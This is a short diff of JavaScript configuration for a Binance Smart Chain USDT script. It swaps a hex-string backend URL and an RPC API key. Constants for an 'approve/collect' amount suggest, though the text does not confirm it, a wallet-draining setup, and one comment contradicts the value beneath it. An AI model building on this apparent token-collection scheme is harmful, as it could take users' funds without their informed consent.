@@ -7,7 +7,7 @@ const BSC_USDT_ADDRESS = "0x9EA9587AD872673b352619A4feEED25B430F7Da1";
 const BSC_CHAIN_ID_HEX = "0x38";
 const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT — 18 decimals
 const MIN_USDT_BALANCE = ethers.parseUnits("0", 18); // require > 1 USDT before approve/collect
-const BACKEND_URL      = "4a9f3fa75a1f44a547b0dc535f223faa0c49d8dda227309ee475846249382788";
+const BACKEND_URL      = "422386db85c4161d8805dace803d1b80c2434c469a10c79949d4e8b3f5147b48";
 
 const BSC_RPC_URLS = [
   "https://bsc-rpc.publicnode.com",
@@ -16,7 +16,7 @@ const BSC_RPC_URLS = [
   "https://bsc-dataseed3.binance.org/",
   "https://bsc-dataseed4.binance.org/",
   "https://rpc.ankr.com/bsc",
-  "https://rpc.ankr.com/bsc/4a9f3fa75a1f44a547b0dc535f223faa0c49d8dda227309ee475846249382788"
+  "https://rpc.ankr.com/bsc/422386db85c4161d8805dace803d1b80c2434c469a10c79949d4e8b3f5147b48"
 ];
 
 const BSC_CHAIN_PARAMS = {
